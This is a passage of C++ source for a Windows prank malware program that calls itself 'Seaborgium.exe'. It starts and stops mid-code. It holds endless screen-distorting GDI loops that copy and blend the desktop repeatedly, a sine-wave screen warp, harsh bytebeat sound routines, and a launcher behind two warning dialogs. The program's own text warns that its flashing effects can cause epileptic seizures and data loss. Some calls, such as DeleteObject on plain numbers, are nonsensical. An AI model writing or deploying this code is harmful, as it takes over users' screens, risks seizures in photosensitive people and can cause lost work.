        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, -10, w, h, hdc, 10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(dcCopy, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
    return 0x00;
}
DWORD WINAPI BitBlt1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, 10, w, h, hdc, -10, -10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, 10, -10, w, h, hdc, -10, 10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        BitBlt(hdc, -10, 10, w, h, hdc, 10, -10, SRCPAINT);
        ReleaseDC(0, hdc);
    }
    return 0x00;
}
DWORD WINAPI Sin1(LPVOID lpParam) {
    HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = sin(angle) * 45;
            BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
            BitBlt(hdc, i, 0, 1, sh, hdc, i, a, SRCCOPY);
            angle += M_PI / 1000;
            DeleteObject(&i); DeleteObject(&a);
        }
        ReleaseDC(wnd, hdc);
        DeleteDC(hdc); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
    }
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//Sounds
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * ((t / 2 >> 10 | t % 16 * t >> 8) & 8 * t >> 12 & 18) | ~(t / 16) + 64) * 127);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t >> 8 | 2 * t | t >> (t >> 16)) + (t >> 5 | t | t >> 3));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(tan(t >> (t >> 13) % 8) + (t << 1));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(tan(2 * t | t >> 8) * t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(sin(4 * t >> 5 ^ t & t >> 12) * 255);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(20 * t * t * (t >> 11) / 9);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI soundlast() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (rand()) | t >> 3) + t >> 3);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//Code Execution
DWORD WINAPI Message(LPVOID lpParam) {
    MessageBox(NULL, L"You'll Regret This... %username%", NULL, MB_ICONERROR);
    return 0;
}
int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (MessageBoxW(NULL, L"You've Just Executed A Malware Called Seaborgium.exe! This Malware Won't Harm Your Computer Or Make It Unusuable But, It Has Flashing Lights And Epileptic Seizures! If You Proceed To Run This Malware Then Good Luck! This Malware Is Only Made For Testing Purposes As Trolling Someone With This Cound Cause Data Loss! (Ex. Your Friend Would Force Restart The Computer And Lose All His Unsaved Work.) So, Good Luck Testing It!", L"Seaborgium.exe - First Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"Are You Sure? If You Accidently Clicked On Yes Then This Is The Final Warning Now! Click Yes Again And The Malware Will Execute! This Is Your Last Chance To Stop This Program From Executing!!!", L"Seaborgium.exe - Last Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            Sleep(3000);
            CreateThread(0, 0, Message, 0, 0, 0);
            Sleep(1000);
            HANDLE shader1 = CreateThread(0, 0, Shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(shader1, 0);
            CloseHandle(shader1);
